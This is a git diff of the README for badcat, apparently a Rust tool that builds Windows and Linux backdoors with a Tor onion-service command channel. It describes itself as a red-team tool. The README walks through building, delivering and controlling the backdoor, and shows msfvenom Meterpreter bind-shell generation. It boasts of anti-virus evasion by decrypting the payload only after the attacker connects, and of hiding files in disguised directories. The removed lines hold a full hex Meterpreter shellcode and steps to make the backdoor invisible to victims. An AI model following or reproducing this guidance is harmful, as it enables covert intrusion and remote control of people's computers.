@@ -2,6 +2,8 @@
 
 This a tool intended to be used by Red Teams, in order to mimic APT ([Advanced Persistent Threat](https://csrc.nist.gov/glossary/term/advanced_persistent_threat)) attacks. It hides the C2 ([Command and Control](https://csrc.nist.gov/glossary/term/C2)) server by using [Onion Services](https://community.torproject.org/onion-services/overview/) to masquerade attacker's real IP address.
 
+The initial Proof of Concept is in the branch [initial-poc](https://github.com/yanmarques/badcat/tree/initial-poc). One will find there the first attempt to implement such idea. The initial PoC exists for historical reasons, and should only be used for testing.
+
 # Glossary
 _attacker_: conductor of the attack.
 
@@ -13,11 +15,12 @@ _server_: _backdoor_ running Tor Onion Service on the _victim_.
 
 # Features
 
-1. Bundle Tor executable inside the _backdoor_.
+1. Embeded Tor executable inside the _backdoor_. No need to create a new process for the Tor binary.
 2. Automatic Onion Service configuration using a configurable torrc template.
 3. Authentication to access the _server_.
 4. Optional use of payload (aka shellcode) in the _backdoor_, which is only executed once the attacker connects evading any AV real time monitoring. When not using a payload, fallback to badcat's basic shell.
-5. XOR encryption of embedded Tor executable and payload.
+5. Execution of payload can be re-started many times from the attacker.
+5. XOR encryption of every sensible thing.
 6. Full [rust](https://www.rust-lang.org/) source code.
 
 # Alternatives
@@ -26,15 +29,19 @@ So far I have only found [ToRat](https://github.com/lu4p/ToRat) as a good altern
 
 ## ToRat
 
-ToRat is a Remote Administration tool using Tor as a transport mechanism and RPC for communication. There are conceptual differences between badcat and ToRat. The former focuses at creating an environment for shipping an anonymous backdoor  with user adaptable payload. On the other hand, ToRat tries to be an All-In-One solution, featuring among other things, util commands via RPC, cross-platform and multi-user persistence, code obfuscation.
+ToRat is a Remote Administration tool using Tor as a transport mechanism and RPC for communication. There are conceptual differences between badcat and ToRat. The former focuses at creating an environment for shipping an anonymous backdoor with user adaptable payload. On the other hand, ToRat tries to be an All-In-One solution, featuring among other things, util commands via RPC, cross-platform and multi-user persistence, code obfuscation.
 
-The big advantage of badcat compared to ToRat is the way it uses the Onion Service. Differently than ToRat, the server starts in the client and the attacker connects to the server, using the bind tcp approach. The main reason for this is convinience, because the attacker never needs to worry about keeping a server up and running, and by that I mean, secured, with log-rotation and backups. One other argument - although as far as I know nothing confirm that - it's that the attack surface to deanonymize an Onion Service is in a higher degree than to deanonymize a common Tor user.
+The big advantage of badcat compared to ToRat is the way it uses the Onion Service. Differently than ToRat, the server starts in the client and the attacker connects to the server, using the bind tcp approach. In the situation you are behind a Tor proxy and can't change Tor's configuration, this approach can be benefitial.
+
+Also badcat support arbitrary payload execution in order to allow quick generation of full-featured backdoors shipping a Meterpreter shellcode, for example.
 
 # Getting Started
 
+To get started, one just need to configure the `rust` ecosystem, it's easy.
+
 ## Install Rust
 
-1. Follow the instructions to install `rustup` tool: https://www.rust-lang.org/tools/install.
+Follow the instructions to install `rustup` tool: https://www.rust-lang.org/tools/install.
 Select the default installation. Rustup prepares your environment for cross-compilation and dependency management using `cargo`.
 
 ```bash
@@ -63,15 +70,6 @@ info: This is the version for the rustup toolchain manager, not the rustc compil
 info: The currently active `rustc` version is `rustc 1.56.1 (59eed8a2a 2021-11-01)`
 ```
 
-2. For configuring the Onion Service we need a tool for generating the hostname and the private key, for this badcat uses `mkp224o`. Follow the instructions to generate the binary https://github.com/cathugger/mkp224o#mkp224o---vanity-address-generator-for-ed25519-onion-services.
-
-After you have compile `mkp224o` add the binary to your `PATH` environment, so badcat is able to call it. Ensure `mkp224o` is discoverable by your shell with:
-
-```bash
-$ which mkp224o
-/home/myuser/.local/bin/mkp224o
-```
-
 ## Simple Quick Usage
 
 This quick example shows how to generate the _backdoor_ for a Windows x64 machine using Fedora (Linux). Let's breakdown the steps to gain remote command execution into 4 steps.
@@ -93,6 +91,11 @@ We need to configure `rust` to target the Windows host.
 ```bash
 $ rustup target add x86_64-pc-windows-gnu
 $ rustup toolchain install stable-x86_64-pc-windows-gnu
+```
+
+And one may get the following output:
+
+```bash
 error: DEPRECATED: future versions of rustup will require --force-non-host to install a non-host toolchain as the default.
 warning: toolchain 'stable-x86_64-pc-windows-gnu' may not be able to run on this system.
 warning: If you meant to build software to target that platform, perhaps try `rustup target add x86_64-pc-windows-gnu` instead?
@@ -144,8 +147,8 @@ Finally we are able to compile the _backdoor_. Every time you build a _backdoor_
 
 Once you have created the configuration from the example, we are done to build the _backdoor_ using the default configurations, which are the following:
 
-- badcat's basic shell
-- Tor executable directly from The Tor Project, which - unfortunately - is compiled to open a Windows console by default. See [Invisible _backdoor_](#invisible-backdoor) section of how to fix that.
+- name of target host as `a host that knows you are hacking them`. This name is used to identificate which machine to connect, so change them accordingly to keep yourself organized.
+- payload disabled, so badcat's basic shell will be used.
 
 Build the _backdoor_ targeting Windows x64:
 
@@ -160,84 +163,23 @@ $ file target/x86_64-pc-windows-gnu/release/victim.exe
 target/x86_64-pc-windows-gnu/release/victim.exe: PE32+ executable (GUI) x86-64, for MS Windows
 ```
 
-That seems fine. You may now had noticed that a new file called `hosts.json` was created. That is the configuration file used to connect to the _victim_ using the attacker toolkit.
+That seems fine. You may now had noticed that a new file called `hosts.json` was created. That is the configuration file used to connect to the _victim_ using the attacker toolkit. It contains a list of host objects, so whenever you build a new _backdoor_ the `hosts.json` is updated with the new host information.
 
 ### 4. Delivery and Control
 
-Deliver the generated executable to the _victim_ and execute it. In the image below you'll see a console opened, it's the Tor binary from The Tor Project.
+Deliver the generated executable to the _victim_ and execute it. The figure 1 shows the size of the _backdoor_ and the date which Microsoft Windows Defender does not catch it.
 
-![Windows screenshot of running _backdoor_](https://user-images.githubusercontent.com/28604565/143434657-6e080c8b-479a-456f-8547-d8840bb5ebb4.png)
+Figure 1 - Windows screenshot of running _backdoor_
+![Windows screenshot of running _backdoor_](https://user-images.githubusercontent.com/28604565/144435072-3c5d9eac-7abf-4c57-905a-e2b2d75c1b1f.png)
 
-Now configure Tor at your attacker machine and connect to the victim through the attacker toolkit. The attacker toolkit already uses the default Tor socks address.
+Now configure Tor at your attacker machine and connect to the victim through the attacker toolkit. The attacker toolkit already uses the default Tor socks address. The figure 2 presents the toolkit interface and the PowerShell opened for commands. 
 
-![Attacker toolkit connected to _backdoor_](https://user-images.githubusercontent.com/28604565/143600952-b127192f-3aff-4114-b76e-bd7704ce4f0b.png)
+Figure 2 - Attacker toolkit connected to _backdoor_
+![Attacker toolkit connected to _backdoor_](https://user-images.githubusercontent.com/28604565/144435172-272add11-93ef-4515-8154-4b3ca73422c0.png)
 
 ## Advanced Usage
 
 You'll find in this topic advanced ways to accomplish better results compared to the [simple quick usage](#simple-quick-usage) example.
-
-### Invisible _backdoor_
-
-The default behaviour of badcat's _backdoor_ is to hide the Windows console. Although the Tor binary is still visible to the user and may alert him about a compromise. A good backdoor behaviour would be to never show itself to the user, at least at a higher level. In order to hide the Tor console we need to provide the `-mwindows` flag to the compiler which means we need to compile it from source.
-
-Fortunately, badcat provides an automated way to perform the compilation using docker containers. The container installs all the dependencies and executes `build-tor-windows` shellscript.
-
-```bash
-$ docker build -t wintor .
-$ docker run -v ./target:/target --rm wintor
-```
-
-Note the latter command provides a volume mounted at `/target` directory. This is the location where the Tor binary will be copied into.
-
-Once the compilation finished - it take a while, check the generated binary:
-
-```bash
-$ file target/tor.exe
-target/tor.exe: PE32+ executable (GUI) x86-64, for MS Windows
-```
-
-Now you have to tell badcat to use your newly Tor binary. Badcat understands Tor binaries in two forms: a remote URL or a local file. We'll use a local file pointing at a directory which the binary is located. You cannot just throw your binary there, you have follow by the rules:
-
-1. Binary must be inside an `App` directory.
-2. Binary name must equal the `tor.executable` setting. Example:
-
-The following directory structure:
-
-victim
-├── tor-windows
-│   └── App
-│       └── myAmazingApp.exe
-
-Then your `settings.json` should look like below:
-
-**Note: your directory is defined at `tor.download_url.windows`, and the location is relative to `victim` directory.**
-
-```json
-{
-    "name": "my invisible backdoor",
-    "hosts_file": "../hosts.json",
-    "tor": {
-        "build_for_windows": true,
-        "download_url": {
-            "windows": "file://tor-windows",
-            "linux": "file://tor-linux/"
-        },
-        "destination_dir": {
-            "windows": "AppData\\Local\\Microsoft",
-            "linux": ".local/share/Trash/.repo"
-        },
-        "rc_file": "torrc",
-        "executable": "myAmazingApp"
-    },
-    "payload": {
-        "enabled": false,
-        "hex": "",
-        "bind_port": "9001"
-    }
-}
-```
-
-Now you compile, deliver and control the _backdoor_ as usual.
 
 ### Executing Custom Payload
 
@@ -247,60 +189,44 @@ Examples:
 
 ### 1. Connect through a custom shell
 
-First translate your payload to hexadecimal. Then enable payload at your `settings.json` and update them to reflect your payload and bind port - using port `4444` for the purpose of this example:
+Generate your payload and write the raw bytes to a file. Then enable payload at your `settings.json` and update them to reflect your payload and bind port - using port `4444` for the purpose of this example:
 
 ```json
 {
     "name": "my custom shell",
     "hosts_file": "../hosts.json",
     "tor": {
-        "build_for_windows": true,
-        "download_url": {
-            "windows": "file://tor-windows",
-            "linux": "file://tor-linux/"
-        },
-        "destination_dir": {
+        "spoof_dir": {
             "windows": "AppData\\Local\\Microsoft",
             "linux": ".local/share/Trash/.repo"
         },
         "rc_file": "torrc",
-        "executable": "myAmazingApp"
     },
     "payload": {
         "enabled": true,
-        "hex": "MY EXTREME LARGE HEX SHELLCODE",
+        "file": "MY-AWESOME-PAYLOAD.bin",
         "bind_port": "4444"
     }
 }
 ```
 
-Now compile your _backdoor_ and deliver as usual.
+**Note: Before compiling your _backdoor_ and deliver as usual, ensure the build target is the right one for your payload. I mean, if you are using a Linux payload you could target Windows, but the payload would never execute properly.**
 
-When connecting, the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your shell using the onion address and the port as `settings.payload.bind_port` 4444 in our example.
+When connecting, the attacker toolkit will execute the payload for you, but according to figure 3, nothing will really show up. Instead you'll be able to connect directly to your shell using the onion address and the port as `settings.payload.bind_port` - 4444 in our example.
 
-```bash
-$ ./attacker -f hosts.json
-Badcat attacker toolkit. Connect to your hosts
-Type help for commands.
-
-# list
-0 my custom shell true  andji3
-# connect 0
-trying to connect (attempt 0)...
-connected to: Ip(0.0.0.0:0)
-Your payload should be accessible now at: andji3yvdyslric3yfgnj665xfybagiyfqjdeurzuv3ejef2flwztrid.onion:PAYLOAD_PORT
-```
+Figure 3 - Attacker toolkit message about the payload
+![Attacker toolkit message about the payload](https://user-images.githubusercontent.com/28604565/144483939-e72bc74c-5e0f-481c-b14c-b639bde7de2a.png)
 
 ### 2. Connect through a meterpreter session
 
-Using meterpreter gives you a full-featured remote administration, but it's well known and blocked by most anti-viruses. With badcat, you evade all anti-virus detection because you only decrypt and execute the payload after the _attacker_ connects.
+Using Meterpreter gives you a full-featured remote administration, but it's well known and blocked by most anti-viruses. With badcat, you evade - as far as I can tell - almost all anti-virus detection because you only decrypt and execute the payload after the _attacker_ connects.
 
-The steps to use a meterpreter shellcode is exactly the same as in example 1.
+The steps to use a Meterpreter shellcode is exactly the same as in example 1.
 
-Generate the shellcode as hexadecimal using `msfvenom`:
+Generate the shellcode as raw bytes with `msfvenom`:
 
 ```bash
-$ msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f hex
+$ msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f raw -o payload.bin
 ```
 
 Then enable payload at your `settings.json` and update them to reflect your payload and bind port - using port `6666` for the purpose of this example:
@@ -310,21 +236,15 @@ Then enable payload at your `settings.json` and update them to reflect your payl
     "name": "my meterpreter",
     "hosts_file": "../hosts.json",
     "tor": {
-        "build_for_windows": true,
-        "download_url": {
-            "windows": "file://tor-windows",
-            "linux": "file://tor-linux/"
-        },
-        "destination_dir": {
+        "spoof_dir": {
             "windows": "AppData\\Local\\Microsoft",
             "linux": ".local/share/Trash/.repo"
         },
         "rc_file": "torrc",
-        "executable": "myAmazingApp"
     },
     "payload": {
         "enabled": true,
-        "hex": "fc4881e4f0ffffffe8cc0000004151415052514831d265488b5260488b521856488b5220480fb74a4a4d31c9488b72504831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d08b481850448b40204901d0e3564d31c948ffc9418b34884801d64831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e54831c0505049c7c402001a0a41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a025950504d31c94d31c048ffc04889c241baea0fdfe0ffd54889c76a1041584c89e24889f941bac2db3767ffd54831d24889f941bab7e938ffffd54d31c04831d24889f941ba74ec3be1ffd54889f94889c741ba756e4d61ffd54881c4b00200004883ec104889e24d31c96a0441584889f941ba02d9c85fffd54883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd54801c34829c64885f675e141ffe7586a005949c7c2f0b5a256ffd5",
+        "file": "../payload.bin",
         "bind_port": "6666"
     }
 }
@@ -332,22 +252,18 @@ Then enable payload at your `settings.json` and update them to reflect your payl
 
 Now compile your _backdoor_ and deliver as usual.
 
-When connecting, the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your meterpreter session using the onion address and the port as `settings.payload.bind_port` 9999 in our example.
+In the moment the _attacker_ connects and payload is going be executed on the _victim_, one may see the common Microsoft Windows Defender - useless - Alert, ilustrated on figure 4. This alert is extremelly generic, and users tend to ignore such alerts because it does not say it's a malware. But thats kind of funny that the payload was already executed and the port is listening in the background. And even if one does not `Allow access`, the payload keeps running and Windows does nothing about it.
 
-```bash
-$ ./attacker -f hosts.json
-Badcat attacker toolkit. Connect to your hosts
-Type help for commands.
+Figure 4 - Microsoft Windows Defender Alert
+![Microsoft Windows Defender useless Alert](https://user-images.githubusercontent.com/28604565/144487035-746a3e80-155e-42d5-b75b-cbe8f7fcb054.png)
 
-# list
-0 my meterpreter true  anjgnj
-# connect 0
-trying to connect (attempt 0)...
-connected to: Ip(0.0.0.0:0)
-Your payload should be accessible now at: aqti2jzrbmniqsnwmi3zmxxy3edynawa472ywdj42nk2wox6akpkodqd.onion:PAYLOAD_PORT
-```
+After `Canceling` or `Allowing access` through Microsoft Windows Defender Alert, you are able to connect directly to your meterpreter session using the onion address and the port as `settings.payload.bind_port` `6666` in our example.
 
-After you have connected, fire up `msfconsole` - using `proxychains` or something similar - in order to open a meterpreter session through the Tor network. It's fundamental that msfconsole is proxied through the Tor network or one will not be able to connect to the _server_.
+Fire up `msfconsole` - using `proxychains` or something similar - in order to open a meterpreter session through the Tor network. It's fundamental that msfconsole is proxied through the Tor network or one will not be able to connect to the _server_. 
 
-![Msfconsole opened with session from badcat](https://user-images.githubusercontent.com/28604565/143482772-40267d27-9e9e-4f41-80e9-c956e5432be0.png)
+With `msfconsole` opened, configure a handler for your payload and exploit it.
+
+Figure 5 - Meterpreter session opened through badcat
+![Meterpreter session opened through badcat](https://user-images.githubusercontent.com/28604565/144487158-6ef721e7-2d2b-498c-a6c0-038434872182.png)
+
 
